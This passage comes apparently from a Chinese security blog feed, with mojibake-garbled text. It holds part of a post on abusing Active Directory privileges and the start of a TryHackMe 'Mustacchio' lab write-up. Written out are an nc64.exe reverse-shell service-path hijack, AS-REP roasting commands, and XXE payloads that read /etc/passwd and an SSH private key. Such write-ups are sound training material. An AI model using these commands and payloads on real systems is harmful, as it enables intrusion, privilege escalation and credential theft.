alt="img"></p><p>Ê≠§Êó∂Ôºå‰πãÂâçÂà©Áî®<code>python</code>Ëµ∑ÁöÑ<code>smbserver</code>ÊúçÂä°‰ºöÊî∂Âà∞ÂõûÊòæ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475513971-bf7ec014-3dde-4ea8-b0d9-e76bc3e3ecd7.png" alt="img"></p><h1>Êª•Áî®AD Recycle BinÊùÉÈôêÂÆûÁé∞ÊùÉÈôêÊèêÂçá</h1><p><strong>ÁÆÄ‰ªãÔºö</strong><code>AD Recycle Bin</code>ÊòØ‰∏Ä‰∏™ËëóÂêçÁöÑ Windows ÁªÑ„ÄÇ<a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/">Active Directory ÂØπË±°ÊÅ¢Â§çÔºàÊàñÂõûÊî∂Á´ôÔºâ</a>ÊòØ Server 2008 ‰∏≠Ê∑ªÂä†ÁöÑ‰∏ÄÈ°πÂäüËÉΩÔºåÂÖÅËÆ∏ÁÆ°ÁêÜÂëòÊÅ¢Â§çÂ∑≤Âà†Èô§ÁöÑÈ°πÁõÆÔºåÂ∞±ÂÉèÂõûÊî∂Á´ôÂØπÊñá‰ª∂ÊâÄÂÅöÁöÑ‰∏ÄÊ†∑„ÄÇÂú® Windows Server 2012 ‰πãÂâçÔºå‰ªé AD ÂõûÊî∂Á´ôËøòÂéüÂØπË±°ÈúÄË¶Å‰ΩøÁî® LDAP Â∑•ÂÖ∑Êàñ PowerShell ÂàóÂá∫ÊâÄÊúâÂ∑≤Âà†Èô§ÁöÑÂØπË±°ÔºåÁ≠õÈÄâ‰∏ÄÈïø‰∏≤ÂØπË±°‰ª•ÊâæÂà∞ÊâÄÈúÄÁöÑÂØπË±°ÔºåÁÑ∂Âêé‰ΩøÁî®Âè¶‰∏Ä‰∏™ PowerShell ÂëΩ‰ª§Êù•ËøòÂéüÂÆÉ„ÄÇ</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">ÂèÇËÄÉÈìæÊé•</a></p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>ÂΩìÂâçÊàë‰ª¨ÊãøÂà∞‰∫ÜarksvcÁî®Êà∑ÁöÑshellÔºåÊàë‰ª¨‰πãÂâçËøòÊâæÂà∞‰∫Ü‰∏Ä‰∏™ÊóßÁîµÂ≠êÈÇÆ‰ª∂ÔºåÂú®ËØ•ÈÇÆ‰ª∂‰∏≠ÊèêÂà∞‰∏¥Êó∂ÁÆ°ÁêÜÂëòÂ∏êÊà∑TempAdmin‰ΩøÁî®‰∫Ü‰∏éÊ≠£Â∏∏ÁÆ°ÁêÜÂëòÂ∏êÊà∑Áõ∏ÂêåÁöÑÂØÜÁ†ÅÔºàÂØÜÁ†ÅÂ§çÁî®Ôºâ„ÄÇ</p><p>ÈÄöËøá‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Êàë‰ª¨ÂèØ‰ª•Êü•ÁúãÂΩìÂâçÁî®Êà∑ÁöÑÊâÄÂ±ûÁªÑ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475837278-8d50a4a2-e1df-4627-ac9d-f48bf6575c13.png" alt="img"></p><p>ÂèëÁé∞ËØ•Áî®Êà∑Â±û‰∫é <code>AD Recycle Bin</code> ÁªÑ‰∏ã</p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Êù•ÂàóÂá∫ÊâÄÊúâÂ∑≤Âà†Èô§ÁöÑÂØπË±°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27; -includeDeletedObjects</span><br></pre></td></tr></table></figure><p>ÊúÄÂêé‰∏ÄÊù°ÊØîËæÉÊúâÊÑèÊÄùÔºåÊàë‰ª¨ÂèëÁé∞‰∫ÜÂâçÈù¢ÊèêÂà∞ÁöÑ‰∏¥Êó∂Áî®Êà∑<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475859325-8779824d-b8cc-4b0d-a80b-e5b2856edb2f.png" alt="img"></p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®‰ª•‰∏ãÂëΩ‰ª§Êù•Ëé∑ÂæóËØ•Â∏êÊà∑ÁöÑÊâÄÊúâËØ¶ÁªÜ‰ø°ÊÅØÔºö</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475880391-e2411730-f329-425e-97d8-20698e5532fc.png" alt="img"></p><p>Âú®ËØ•Áî®Êà∑ÁöÑËØ¶ÁªÜ‰ø°ÊÅØ‰∏≠ÔºåÊàë‰ª¨ÂèëÁé∞‰∫ÜËØ•Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂ∞ùËØïËß£ÂØÜÂêéÊàêÂäüÂæóÂà∞‰∫ÜTempAdminÁî®Êà∑ÁöÑÂØÜÁ†Å</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475890680-ac1aece6-3118-4631-b56d-4e3d66390fd2.png" alt="img"></p><h1>Êª•Áî®GenericWriteÊùÉÈôêÂÆûÁé∞Ê®™ÂêëÁßªÂä®</h1><p>ÁÆÄ‰ªãÔºöGenericWriteÊùÉÈôê‰πüÂ∞±ÊòØÈÄöÁî®ÂÜôËÆøÈóÆÊùÉÈôêÔºåËØ•ÊùÉÈôêÊéà‰∫à‰Ω†ÂÜôÂÖ•ÁõÆÊ†áÂØπË±°‰∏ä‰ªª‰Ωï‰∏çÂèó‰øùÊä§ÁöÑÂ±ûÊÄßÁöÑËÉΩÂäõÔºåÂåÖÊã¨ÁªÑÁöÑ‚ÄúÊàêÂëò‚ÄùÂíåÁî®Êà∑ÁöÑ‚ÄúÊúçÂä°‰∏ª‰ΩìÂêçÁß∞‚Äù„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>ÂΩìÂâçÊàë‰ª¨ÊãøÂà∞‰∫ÜÁî®Êà∑sbauerÁöÑshellÔºåËøôÈáåÊàë‰ª¨Â∞ùËØï‰ΩøÁî®BlooodhoundËøõË°å‰ø°ÊÅØÊêúÈõÜ</p><p>Êàë‰ª¨Â∞ÜbloodhoundÁîüÊàêÁöÑjsonÊñá‰ª∂ÂØºÂÖ•bloodhoundÂàÜÊûêÔºåÂèëÁé∞ÂΩìÂâçÁî®Êà∑ÂØπJORDENÁî®Êà∑ÂÖ∑ÊúâÈÄöÁî®ÂÜôÊùÉÈôêÔºåËÄåJORDENÁî®Êà∑Â±û‰∫éSERVER_OPERATORSÁªÑÔºàÈ´òÊùÉÈôêÁªÑÔºâ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476044125-d4e5a90e-0eef-4ba9-8b65-0b649b2ba734.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476048485-acb32246-5fac-4f8a-a765-f008c9ac1260.png" alt="img"></p><p>ËøôÈáåÊàë‰ª¨ËØ¥‰∏Ä‰∏ã AS-REP roastingÊîªÂáªÔºåËØ•ÊîªÂáªÂÖÅËÆ∏‰∏∫ÈÄâÊã©‰∫Ü‚Äú‰∏çÈúÄË¶Å Kerberos È¢ÑË∫´‰ªΩÈ™åËØÅ‚ÄùÂ±ûÊÄßÁöÑÁî®Êà∑Ê£ÄÁ¥¢ÂØÜÁ†ÅÂìàÂ∏åÁöÑÊäÄÊúØ„ÄÇÂ¶ÇÊûúÁî®Êà∑Ê≤°ÊúâÂêØÁî® Kerberos È¢ÑË∫´‰ªΩÈ™åËØÅÔºåÊàë‰ª¨ÂèØ‰ª•‰∏∫ËØ•Áî®Êà∑ËØ∑Ê±Ç AS-REPÔºåÂπ∂‰∏îÂèØ‰ª•Á¶ªÁ∫øÁ†¥Ëß£‰ªéËÄåÂ∞ùËØïÊÅ¢Â§çÂÖ∂ÊòéÊñáÂØÜÁ†Å„ÄÇËÄåËøôÈáåSBAUERÁî®Êà∑ÂØπJORDENÁî®Êà∑ÂÖ∑ÊúâÈÄöÁî®ÂÜôÊùÉÈôêÔºåÈÇ£‰πàÊàë‰ª¨ÂèØ‰ª•‰∏∫JORDENÁî®Êà∑ËÆæÁΩÆ‚Äú‰∏çÈúÄË¶Å Kerberos È¢ÑË∫´‰ªΩÈ™åËØÅ‚ÄùÁöÑÂ±ûÊÄßÔºå‰ªéËÄåÂ∞ùËØï‰ΩøÁî®AS-REP roastingÊîªÂáªËé∑ÂèñÂÖ∂ÊòéÊñáÂØÜÁ†Å„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®‰∏ãÈù¢ËøôÊù°ÂëΩ‰ª§Êù•‰∏∫JORDENÁî®Êà∑ËÆæÁΩÆ‚Äú‰∏çÈúÄË¶Å Kerberos È¢ÑË∫´‰ªΩÈ™åËØÅ‚ÄùÁöÑÂ±ûÊÄß</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®impactet‰∏ãÁöÑGetNPUsersËÑöÊú¨Êù•Ëé∑ÂèñjordenÁî®Êà∑ÁöÑAS-repÁ•®ÊçÆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476143216-698c4f6a-f388-42dd-a82a-2ee98e260bef.png" alt="img"></p><p>Êàë‰ª¨ÊääËé∑ÂèñÂà∞ÁöÑÁ•®ÊçÆÊîæÂà∞hashÊñá‰ª∂‰∏≠ÔºåÁÑ∂Âêé‰ΩøÁî®johnÂ∞ùËØïÁ†¥Ëß£Ëé∑ÂèñÂÖ∂ÊòéÊñáÂØÜÁ†Å</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476176979-31d3745a-67a1-4f4a-ad78-6dd2636610aa.png" alt="img"></p><h1>Êª•Áî®Server OperatorsÁªÑÊùÉÈôêÂÆûÁé∞ÊùÉÈôêÊèêÂçá</h1><p>ÁÆÄ‰ªãÔºöServer OperatorsÁªÑÔºöËØ•ÁªÑ‰ªÖÂ≠òÂú®‰∫éÂüüÊéßÂà∂Âô®‰∏äÁöÑÂÜÖÁΩÆÁªÑ„ÄÇÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËØ•ÁªÑÊ≤°ÊúâÊàêÂëò„ÄÇÊúçÂä°Âô®Êìç‰ΩúÂëòÂèØ‰ª•‰∫§‰∫íÂºèÁôªÂΩïÂà∞ÊúçÂä°Âô®ÔºõÂàõÂª∫ÂíåÂà†Èô§ÁΩëÁªúÂÖ±‰∫´ÔºõÂêØÂä®ÂíåÂÅúÊ≠¢ÊúçÂä°ÔºõÂ§á‰ªΩÂíåÊÅ¢Â§çÊñá‰ª∂ÔºõÊ†ºÂºèÂåñÁîµËÑëÁ°¨ÁõòÔºõÂπ∂ÂÖ≥Èó≠ËÆ°ÁÆóÊú∫„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>ÂΩìÂâçÊàë‰ª¨ÊãøÂà∞‰∫ÜÁî®Êà∑jordenÁöÑshellÔºåÈªòËÆ§ÊÉÖÂÜµ‰∏ãÔºåËØ•ÁªÑÂÖ∑Â§áÂêØÂä®ÂíåÂÅúÊ≠¢ÊúçÂä°ÁöÑËÉΩÂäõÔºåÂπ∂‰∏îËØ•Áî®Êà∑ÂèØ‰ª•ÁºñËæë‰ªª‰ΩïÊúçÂä°„ÄÇ</p><p>ÊâÄ‰ª•ËøôÈáå‰ΩøÁî®ÊúçÂä°Ë∑ØÂæÑÂä´ÊåÅÁöÑÊñπÂºèÊù•Ëé∑ÂæóÁ≥ªÁªüÊùÉÈôêÔºåÈ¶ñÂÖà‰∏ä‰º†<code>nc64.exe</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476259349-579d5f77-1f83-4c0f-a10f-0b79ba25a3f7.png" alt="img"></p><p>ÁªèËøáÂ§öÊ¨°ÊµãËØïÂêéÂèëÁé∞ÂèØ‰ª•ÊîπÂèò<code>browser</code>ÊúçÂä°ÁöÑË∑ØÂæÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476289851-b941cc82-2cac-4397-aa64-28836741e29c.png" alt="img"></p><p>kali‰∏≠ÁõëÂê¨</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476314438-071e3dff-f44c-4642-af3f-468f24b3703c.png" alt="img"></p><p>ÁÑ∂ÂêéÂú®Èù∂Êú∫‰∏≠ÊâãÂä®ÈáçÂêØ<code>browser</code>ÊúçÂä°</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc.exe </span>stop <span class="keyword">browser</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sc.exe </span>start <span class="keyword">browser</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476328205-93ec8e94-e4e1-4ebd-816a-7906abdb834f.png" alt="img"></p><p>kaliÂõûÊòæ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476340802-ebdc5e40-2d33-4ba0-9c94-a4bc88d719c6.png" alt="img"></p><h1>Êª•Áî®SeBackupÂíåSeRestoreÊùÉÈôêÂÆûÁé∞ÊïèÊÑüÊñá‰ª∂ÁöÑÊã∑Ë¥ùÂíåËØªÂèñ</h1><p>ÁÆÄ‰ªãÔºöSeBackupPrivilegeÊùÉÈôêÔºöÂèØ‰ª•Áî®Êù•ÂÆûÁé∞Â§á‰ªΩÊìç‰ΩúÔºåÂØπÂΩìÂâçÁ≥ªÁªü‰ªªÊÑèÊñá‰ª∂ÂÖ∑ÊúâËØªÊùÉÈôê „ÄÇ SeRestorePrivilegeÊùÉÈôêÔºöËØ•ÊùÉÈôêË¢´ÊèèËø∞‰∏∫‚ÄúÈúÄË¶ÅÊâßË°åÊÅ¢Â§çÊìç‰Ωú‚ÄùÔºåÂπ∂ÂØºËá¥Á≥ªÁªüÂ∞ÜÊâÄÊúâÂÜôËÆøÈóÆÊéßÂà∂ÊùÉÊéà‰∫à‰ªª‰ΩïÁ≥ªÁªü‰∏äÁöÑÊñá‰ª∂ÔºåËÄå‰∏çËÄÉËôëÊñá‰ª∂ ACL„ÄÇ Ê≠§Â§ñÔºåËØ•ÁâπÊùÉÂÖÅËÆ∏ÊåÅÊúâËøõÁ®ãÊàñÁ∫øÁ®ãÊõ¥ÊîπÊâÄÊúâËÄÖÊñá‰ª∂,Âõ†Ê≠§Ëé∑ÂæóÊ≠§ÁâπÊùÉÁöÑÂê´‰πâÂ∫îËØ•ÊòØÊòæËÄåÊòìËßÅÁöÑ„ÄÇ</p><p><strong>ÂÆûÈôÖÂ∫îÁî®Âú∫ÊôØÔºö</strong></p><p>ÈÄöËøá‰ΩøÁî®<code>whoami /priv</code>ÂëΩ‰ª§ÂèëÁé∞ËØ•Áî®Êà∑ÂÖ∑ÊúâSeBackupPrivilege<code>Âíå</code>SeRestorePrivilegeÊùÉÈôê</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476369509-5732c90f-3163-4206-a718-5a14af619fb9.png" alt="img"></p><p>Êúâ‰∫ÜSeBackupPrivilegeÂíåSeRestorePrivilegeËøô‰∏§‰∏™ÊùÉÈôêÔºåÊàëÂ∞±ÂèØ‰ª•Áî®<code>robocopy</code>Êù•Â§çÂà∂ÊïèÊÑüÊñá‰ª∂Âπ∂ËØªÂèñÂÖ∂ÂÜÖÂÆπÔºåÂú®ÂÆûÊàòÁéØÂ¢É‰∏ãÊàë‰ª¨ÂèØ‰ª•Â∞ùËØïËØªÂèñÂÖ∂‰ªñÁöÑ‰∏Ä‰∫õÊïèÊÑüÊñá‰ª∂„ÄÇ</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476393196-787cc0bc-4227-40fa-a7a8-6042007fc928.png" alt="img"></p>]]></content>
    
    
    <summary type="html">ÂüüÊ∏óÈÄè‰∏≠ÂèØÊª•Áî®ÊùÉÈôêÂèäÂÖ∂Â∫îÁî®ÊÄªÁªì</summary>
    
    
    
    <category term="ÂüüÊ∏óÈÄè" scheme="https://www.fomal.cc/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="ÊùÉÈôêÊèêÂçá" scheme="https://www.fomal.cc/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    
    <category term="Ê®™ÂêëÁßªÂä®" scheme="https://www.fomal.cc/tags/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    
    <category term="ÊùÉÈôêÊª•Áî®" scheme="https://www.fomal.cc/tags/%E6%9D%83%E9%99%90%E6%BB%A5%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>THM-Mustacchio</title>
    <link href="https://www.fomal.cc/posts/1b81dcb8.html"/>
    <id>https://www.fomal.cc/posts/1b81dcb8.html</id>
    <published>2024-10-15T06:59:34.000Z</published>
    <updated>2024-10-27T12:35:21.204Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><blockquote><p>Èù∂Êú∫ipÔºö10.10.235.246</p><p>ÊîªÂáªÊú∫ipÔºö10.14.90.122</p></blockquote><h1>‰ø°ÊÅØÊî∂ÈõÜ</h1><h2 id="nmapÊâ´Êèè">nmapÊâ´Êèè</h2><p><code>nmap -T4 -A -sV -sC -p- 10.10.235.246</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST</span><br><span class="line">Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining)</span><br><span class="line">Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.235.246</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)</span><br><span class="line">|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)</span><br><span class="line">|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-title: Mustacchio | Home</span><br><span class="line">8765/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Mustacchio | Login</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 5.4 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   275.52 ms 10.14.0.1</span><br><span class="line">2   355.01 ms 10.10.235.246</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 361.77 seconds</span><br></pre></td></tr></table></figure><p>ÂèØ‰ª•ÁúãÂá∫ÂºÄÊîæ‰∫Ü22Ôºå80Ôºå8765Á´ØÂè£</p><h2 id="80Á´ØÂè£">80Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151010430-1583807408.png" alt="image-20241015150958963"></p><p>Êâ´Êèè‰∏ãÁõÆÂΩï</p><p><code>gobuster dir -u http://10.10.235.246/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151712711-928501733.png" alt="image-20241015151701655"></p><p>ÂèëÁé∞Êúâ‰∏™<code>robots.txt</code>ÔºåËÆøÈóÆ‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151751823-1230137278.png" alt="image-20241015151741043"></p><p>Ê≤°Âï•‰∏úË•øÔºåÁªßÁª≠Êü•ÁúãÂÖ∂‰ªñÁõÆÂΩïÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152256352-1632797138.png" alt="image-20241015152243976"></p><p>Âú®<code>/custom/js/</code>‰∏ãÊâæÂà∞<code>users.bak</code>Êñá‰ª∂ÔºåÂÉèÊòØÂ§á‰ªΩÊñá‰ª∂Ôºå‰∏ãËΩΩÂà∞Êú¨Âú∞Êü•Áúã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152858740-1160933654.png" alt="image-20241015152847711"></p><p>ÁúãËµ∑Êù•ÂÉèÊòØÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÊï∞ÊçÆÔºåËøôÈáåÊúâadminÁöÑÂä†ÂØÜÂØÜÁ†ÅÔºåÂ∞ùËØïÁ†¥Ëß£‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153033461-1519619990.png" alt="image-20241015153022188"></p><p>Âà©Áî®<code>john</code>ÊàêÂäüËé∑ÂèñÂà∞adminÁî®Êà∑ÁöÑÊòéÊñáÂØÜÁ†Å<code>bulldog19</code></p><h2 id="8765Á´ØÂè£">8765Á´ØÂè£</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151929654-275177714.png" alt="image-20241015151918464"></p><p>ÂÉèÊòØadminÂêéÂè∞ÁôªÈôÜÈ°µÈù¢</p><p>‰ΩøÁî®‰πãÂâçËé∑ÂèñÂà∞ÁöÑÁî®Êà∑ÂêçÂØÜÁ†ÅÂ∞ùËØïÁôªÂΩï</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153202210-1089947038.png" alt="image-20241015153151381"></p><p>ÊàêÂäüÁôªÂΩï</p><p>ÂÉèÊòØÊ∑ªÂä†ÂÜÖÂÆπÁöÑ‰∏Ä‰∏™È°µÈù¢ÔºåÊü•Áúã‰∏ãÊ∫êÁ†Å</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153411288-847205401.png" alt="image-20241015153400373"></p><p>ÂèàÂæóÂà∞‰∏§‰∏™ÈáçË¶ÅÊèêÁ§∫Ôºå‰∏Ä‰∏™ÊòØÂè¶‰∏Ä‰∏™bakÊñá‰ª∂Ôºå‰∏Ä‰∏™ÊèêÁ§∫Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®sshËøûÊé•BarryÁî®keyÔºå‰ΩÜÊòØÊàë‰ª¨ÁõÆÂâçËøòÊ≤°ÊúâBarryÁî®Êà∑ÁöÑkey</p><p>ÂÖàÁúã‰∏ãbakÊñá‰ª∂</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153629081-249297029.png" alt="image-20241015153618211"></p><p>ÂÜÖÂÆπÊúâÁÇπÂÉè‰πãÂâçÊ∑ªÂä†ÂÜÖÂÆπÁöÑÊ†ºÂºèÔºåÂ∞ùËØïÊ∑ªÂä†‰∏Ä‰∏ã</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153834233-1962745226.png" alt="image-20241015153823235"></p><p>ÂèëÁé∞Ê†ºÂºèÊ≠£Á°ÆÔºåÂèØ‰ª•ËØï‰∏ãÂÖ∂‰ªñÁöÑÂÜÖÂÆπÔºåÊµãËØïÊòØÂê¶Â≠òÂú®xxeÊºèÊ¥û</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154132533-1313842141.png" alt="image-20241015154121078"></p><p>ÂèëÁé∞ËÉΩÂ§üËØªÂèñ<code>/etc/passwd</code>Êñá‰ª∂ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Â∞ùËØïËØªÂèñ<code>Barry</code>Áî®Êà∑ÁöÑsshÁßÅÈí•Êù•ÁôªÂΩïËØ•Áî®Êà∑</p><h1>SSHËé∑ÂèñuserÊùÉÈôê</h1><p>È¶ñÂÖàÁ°ÆÂÆöÂ•ΩÁßÅÈí•ÁöÑÁªùÂØπË∑ØÂæÑ</p><p><code>/home/barry/.ssh/id_rsa</code></p><p>ÊûÑÈÄ†ÊÅ∂ÊÑèÂÜÖÂÆπ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/barry/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span 